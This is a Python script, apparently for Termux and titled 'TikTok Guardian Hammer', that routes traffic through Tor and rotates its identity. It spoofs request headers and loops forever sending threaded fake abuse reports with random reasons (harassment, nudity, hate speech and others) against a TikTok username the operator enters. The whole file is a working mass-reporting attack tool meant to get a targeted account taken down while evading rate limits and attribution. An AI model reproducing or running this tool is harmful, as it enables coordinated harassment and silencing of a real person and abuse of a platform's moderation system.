#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TikTok Guardian Hammer v3.1 - Tor Only Mode (Termux Ready)
"""

import os
import subprocess
import time
import socket
import hashlib
import random
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from fake_useragent import UserAgent  # type: ignore

# ===== إعدادات عامة =====
CONFIG = {
    "tor_socks": "socks5h://127.0.0.1:9050",
    "max_threads": 50,
    "requests_per_round": 20,
    "jitter_range": (0.05, 0.15),
    "control_port": 9051,
    "control_password": "mysecurepass",
    "torrc_path": "/data/data/com.termux/files/usr/etc/tor/torrc",
    "ip_check_url": "https://api.ipify.org"
}


# ===== إنشاء إعدادات torrc إذا غير موجودة =====
def setup_torrc():
    if not os.path.exists(CONFIG["torrc_path"]):
        os.makedirs(os.path.dirname(CONFIG["torrc_path"]), exist_ok=True)
        with open(CONFIG["torrc_path"], "w") as f:
            f.write(f"""
ControlPort {CONFIG["control_port"]}
HashedControlPassword {generate_hashed_password(CONFIG["control_password"])}
SocksPort 9050
""".strip())
        print("[+] Created torrc file with control settings.")

# ===== توليد كلمة مرور مشفرة للـ ControlPort =====
def generate_hashed_password(password: str):
    cmd = f"tor --hash-password {password}"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    return result.stdout.strip().splitlines()[-1]


# ===== إنهاء أي عملية Tor شغالة مسبقًا =====
def kill_existing_tor():
    os.system("pkill -f tor || true")
    time.sleep(1)


# ===== تشغيل Tor =====
def start_tor():
    subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Starting Tor service...")
    time.sleep(7)


# ===== إرسال أمر NEWNYM لتغيير الهوية =====
def renew_tor_identity():
    try:
        with socket.create_connection(("127.0.0.1", CONFIG["control_port"])) as s:
            s.send(f'AUTHENTICATE "{CONFIG["control_password"]}"\r\n'.encode())
            s.send(b'SIGNAL NEWNYM\r\n')
            s.send(b'QUIT\r\n')
            print("[+] Tor identity renewed.")
    except Exception as e:
        print(f"[ERROR] Could not renew Tor identity: {e}")


# ===== توليد هيدر عشوائي =====
def generate_headers():
    device_id = f"LX{random.randint(10**15, 9 * 10**15):016d}"
    return {
        'User-Agent': UserAgent().random,
        'X-Tt-Token': ''.join(random.choices("abcdef0123456789", k=32)),
        'X-SS-Stub': hashlib.md5(device_id.encode()).hexdigest(),
        'X-Client-Lang': random.choice(['ar-SA', 'en-US']),
        'X-Forwarded-For': '.'.join(str(random.randint(1, 255)) for _ in range(4))
    }


# ===== التحقق من اتصال Tor =====
def test_tor():
    try:
        r = requests.get(CONFIG["ip_check_url"], proxies={'http': CONFIG["tor_socks"], 'https': CONFIG["tor_socks"]}, timeout=6)
        print(f"[✓] Connected via Tor: {r.text.strip()}")
        return True
    except:
        print("[!] Proxy check failed. Tor might not be working.")
        return False


# ===== إرسال تقرير مزيف =====
def send_report(target):
    try:
        session = requests.Session()
        session.proxies = {'http': CONFIG["tor_socks"], 'https': CONFIG["tor_socks"]}
        session.headers.update(generate_headers())
        jitter = random.uniform(*CONFIG["jitter_range"])
        time.sleep(jitter)

        reason = random.choice([
            "inappropriate", "harassment", "spam", "hate_speech",
            "dangerous_acts", "nudity", "violence", "false_info"
        ])

        response = session.post(
            f"https://www.tiktok.com/report?user={target}&reason={reason}",
            timeout=6
        )
        print(f"[+] Report sent: {target} | Reason: {reason} | Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Failed to report {target}: {e}")


# ===== تنفيذ الهجمة =====
def orchestrate_attack(target):
    round_counter = 1
    while True:
        print(f"\n[*] Starting attack round {round_counter} on {target}")
        if not test_tor():
            time.sleep(5)
            continue

        with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
            futures = [executor.submit(send_report, target) for _ in range(CONFIG["requests_per_round"])]
            for future in as_completed(futures):
                if future.exception():
                    print("[ERROR]", future.exception())

        renew_tor_identity()
        round_counter += 1
        time.sleep(3)


# ===== البداية =====
if __name__ == "__main__":
    if sys.platform != 'linux':
        sys.exit("[ERROR] This script is intended for Termux/Linux only.")

    target = input(" :ﻑﺪﻬﺘﺴﻤﻟﺍ ﺏﺎﺴﺤﻟﺍ ﻢﺳﺍ ﻞﺧﺩﺃ")

    kill_existing_tor()
    setup_torrc()
    start_tor()

    try:
        orchestrate_attack(target)
    except KeyboardInterrupt:
        print("\n[+] Attack terminated by user.")
